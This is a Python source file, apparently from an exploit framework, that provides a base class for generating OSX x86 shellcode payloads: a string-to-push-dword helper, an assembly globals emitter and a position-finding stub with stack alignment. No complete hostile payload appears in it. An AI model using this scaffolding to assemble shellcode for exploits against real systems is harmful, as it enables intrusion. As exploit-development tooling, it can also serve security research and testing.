# a _more respectful__ OSX x86 payload generator
#
# these operate under the assumption that you will be using
# mosdef.assemble() in your exploit on the returned code ..
#


import sys
if '.'  not in sys.path: 
    sys.path.append('.')

import struct
import urllib
from exploitutils import *

def s_to_push(s, __endian__):
    """ string to dwords lulz """

    dword  = ''
    dwords = []

    for c in s:
        dword += c
        if len(dword) == 4:
            dwords.append(struct.unpack(__endian__+'L', dword)[0])
            dword = ''

    if dword != '':
        while len(dword) % 4:
            dword += '\x00'
        dwords.append(struct.unpack(__endian__+'L', dword)[0])

    dwords.reverse()
    return dwords

arch_f  = { 'x86' : ['pushl $0x%.8X // %s ', '<'] }


from MOSDEF.mosdefutils import *

class Globals:
    def __init__(self):
        self.data   = []
        self.names  = []

    # default can't be 0 .. for parsing semantics        
    def addDword(self, name, val = 0x41424344):
        if name not in self.names:
            self.data.append( ("_get_dword", name, val) )
            self.names.append(name) 

    def addUnicodeString(self, name, val):
        if name not in self.names:
            self.data.append( ("_get_urllib", name,  msunistring(val)) )
            self.names.append(name)

    def addString(self, name, val):
        if name not in self.names:
            self.data.append( ("_get_urllib_nul", name, val) )
            self.names.append(name)

    def addLabel(self, name):
        if name not in self.names:
            self.data.append( ("_get_label", name, 0) )
            self.names.append(name)
         
    def _get_dword(self, name, val):
        return ["%s:\n" % name, 
                "    .long 0x%08x\n" % val]

    def _get_label(self, name, val):
        return ["%s:\n" % name]

    def _get_urllib_nul(self, name, val):
        return ["%s:\n" % name, 
                "    .urlencoded \"%s\"\n.byte 0x00\n" % urllib.quote(val)]

    def _get_urllib(self, name, val):
        return ["%s:\n" % name, 
                "    .urlencoded \"%s\"\n" % urllib.quote(val)]        
    
    def get(self):
        out = []
        for (fn, name, val) in self.data:
            out += self.__class__.__dict__[ fn ](self, name, val)
            
        return "".join(out)             
        
class basecode:
    def __init__(self):
        self.heading        = ''
        self.functions      = ''
        self.main           = ''
        self._globals       = Globals()
        self.globals        = ''

        # code always starts with getpcloc
        self.getpcloc = """
        shellcodestart:
            jmp findyou
        retpcloc:
            // save the pcloc as base pointer ..
            mov (%esp), %ebp
            ret
        findyou:
            call retpcloc
        getpcloc:
            // 16 byte stack alignment
            xor %ebx, %ebx
            sub $0x10, %ebx
            and %ebx, %esp

            // MAIN
            jmp main
        """

    def _set_globals(self):
        """ sets the globals section """
        self.globals = "globals:\n"
        self.globals += self._globals.get()
        return self.globals

    def __str__(self):
        return self.get()

    def get(self):
        """ constructs and returns the final payload """

        asm = ''
        # we put the globals and functions _before_ main
        # so we get negative call offsets .. this reduces
        # the amount of encoding we have to do

        # in this order, always ..
        self._set_globals() # sets our globals

        asm += self.heading
        asm += '\n'
        asm += self.getpcloc
        asm += '\n'
        asm += self.globals
        asm += '\n'
        asm += '// END OF GLOBALS\n'
        asm += 'main:\n' # entry point from pcloc
        asm += self.main
        asm += '\n'
        asm += 'codeend: // END OF MAIN\n'

        # XXX: if you get YACC EOF errors .. this means you
        # XXX: are missing labels ...
   
        return asm

    def insertHeadingCode(self, code):
        self.heading = code
